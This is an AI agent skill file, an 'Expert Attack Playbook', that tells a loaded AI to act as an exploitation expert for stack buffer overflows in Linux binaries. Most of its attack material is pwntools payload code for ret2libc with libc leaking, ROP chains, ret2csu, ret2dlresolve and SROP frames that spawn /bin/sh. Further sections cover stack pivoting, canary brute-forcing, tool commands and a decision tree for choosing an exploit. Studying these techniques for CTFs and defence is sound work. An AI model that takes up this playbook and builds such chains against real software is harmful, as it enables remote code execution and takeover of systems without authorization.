---
name: stack-overflow-and-rop
description: >-
  Stack overflow and ROP playbook. Use when exploiting buffer overflows to hijack control flow via return address overwrite, ROP chains, ret2libc, ret2csu, ret2dlresolve, or SROP on Linux userland binaries.
---

# SKILL: Stack Overflow & ROP — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert stack-based exploitation techniques. Covers classic buffer overflow, ret2libc, ROP chain construction, ret2csu, ret2dlresolve, SROP, stack pivoting, and canary bypass. Also see [ROP_ADVANCED_TECHNIQUES.md](./ROP_ADVANCED_TECHNIQUES.md) for BROP, ret2vdso, partial overwrite.

## 0. RELATED ROUTING

- [format-string-exploitation](../format-string-exploitation/SKILL.md) — leak canary/libc/PIE before overflow
- [binary-protection-bypass](../binary-protection-bypass/SKILL.md) — bypass NX, ASLR, PIE, canary, RELRO
- [heap-exploitation](../heap-exploitation/SKILL.md) — heap vulnerabilities

---

## 1. STACK LAYOUT

```
High Address
┌─────────────────────┐
│   Return Address    │  ← overwrite target (RIP control)
├─────────────────────┤
│   Saved RBP         │  ← overwrite for stack pivoting
├─────────────────────┤
│   Canary (if enabled)│
├─────────────────────┤
│   Local Variables    │  ← buffer
└─────────────────────┘
Low Address
```

x86-64: 8-byte return addr, calling conv RDI/RSI/RDX/RCX/R8/R9, `syscall` instruction.

---

## 2. RETURN-TO-LIBC

```python
# 64-bit: need gadgets for arguments
pop_rdi = elf_base + 0x401234
payload = b'A' * offset + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)

# Typical libc leak pattern
rop = b'A' * offset
rop += p64(pop_rdi) + p64(elf.got['puts'])
rop += p64(elf.plt['puts'])
rop += p64(main_addr)
io.sendline(rop)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - libc.symbols['puts']
```

```bash
# one_gadget: find single-gadget RCE
one_gadget /path/to/libc.so.6
# constraints must be satisfied (rsp alignment, NULL registers, etc.)
```

---

## 3. ROP CHAIN CONSTRUCTION

| Tool | Command |
|---|---|
| ROPgadget | `ROPgadget --binary elf --ropchain` |
| ropper | `ropper -f elf --search "pop rdi"` |
| pwntools | `rop = ROP(elf); rop.call('system', ['/bin/sh'])` |

Essential gadgets: `pop rdi; ret` (arg1), `pop rsi; pop r15; ret` (arg2), `syscall; ret`, `leave; ret` (pivot), bare `ret` (stack alignment).

**x86-64 stack alignment**: `system()` requires RSP % 16 == 0. Insert extra `ret` if off.

---

## 4. ret2csu — Universal 3-Argument Control

`__libc_csu_init` in nearly all dynamically linked ELFs:

```nasm
; Gadget 1 (csu_init + 0x3a): pop registers
pop rbx  ; 0
pop rbp  ; 1
pop r12  ; function pointer address
pop r13  ; rdx (arg3)
pop r14  ; rsi (arg2)
pop r15  ; edi (arg1, 32-bit only!)
ret

; Gadget 2 (csu_init + 0x20): call
mov rdx, r13
mov rsi, r14
mov edi, r15d
call [r12 + rbx*8]  ; r12 = GOT entry (pointer to function), rbx=0, rbp=1
```

---

## 5. ret2dlresolve

Forge ELF dynamic linking structures to resolve arbitrary function (e.g., `system`) without libc leak.

```python
from pwn import *
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
io.sendline(rop.chain())
io.sendline(dlresolve.payload)
```

---

## 6. SROP — Sigreturn-Oriented Programming

Abuse `sigreturn` to set all registers at once from a fake Signal Frame:

```python
from pwn import *
frame = SigreturnFrame()
frame.rax = constants.SYS_execve  # 59
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret_addr

payload = b'A' * offset
payload += p64(pop_rax_ret) + p64(15)  # SYS_rt_sigreturn = 15
payload += p64(syscall_ret)
payload += bytes(frame)
```

Use when: limited gadgets, no `pop rdx`, static binary, or need to pivot stack.

---

## 7. STACK PIVOTING

| Technique | Precondition |
|---|---|
| `leave; ret` | Control saved RBP to point to fake stack |
| `xchg rsp, rax; ret` | Control RAX |
| SROP pivot | Set RSP in SigreturnFrame |

```
leave;ret pattern:
Overflow: [AAAA...][fake_rbp→buf][leave_ret]
1st leave: rsp=rbp→fake_rbp; pop rbp
1st ret:   rip=leave_ret
2nd leave: rsp=buf+8; pop rbp
2nd ret:   rip=*(buf+8) ← start of ROP in buf
```

---

## 8. CANARY BYPASS

| Technique | Condition |
|---|---|
| Brute-force | `fork()` server (same canary in child): byte-by-byte |
| Format string leak | `%N$p` to read canary from stack |
| Thread canary | Overflow reaches TLS `stack_guard` at `fs:[0x28]` |
| Info disclosure | Canary in leaked uninitialized data |

---

## 9. TOOLS

```bash
checksec ./binary                    # show NX, canary, PIE, RELRO
ROPgadget --binary ./binary          # gadget search + auto-chain
ropper -f ./binary --search "pop rdi"
one_gadget ./libc.so.6               # one-shot RCE gadgets
pwn template ./binary --host x --port y  # exploit skeleton
```

---

## 10. DECISION TREE

```
Stack overflow found?
├── NX disabled? → shellcode on stack (ret2shellcode)
├── NX enabled:
│   ├── Canary? → fork server → brute; format string → leak
│   ├── PIE? → partial overwrite (last 12 bits) or info leak
│   ├── ASLR? → leak libc (puts@GOT/write@GOT)
│   ├── Have libc leak? → ret2libc or one_gadget
│   ├── No libc leak? → ret2dlresolve or SROP
│   ├── Need 3 args, no pop rdx? → ret2csu or SROP
│   ├── Overflow too short? → stack pivot (leave;ret)
│   └── Full RELRO? → target __free_hook/__malloc_hook/_IO_FILE vtable
└── Static binary (no libc)? → SROP + syscall chain (execve)
```
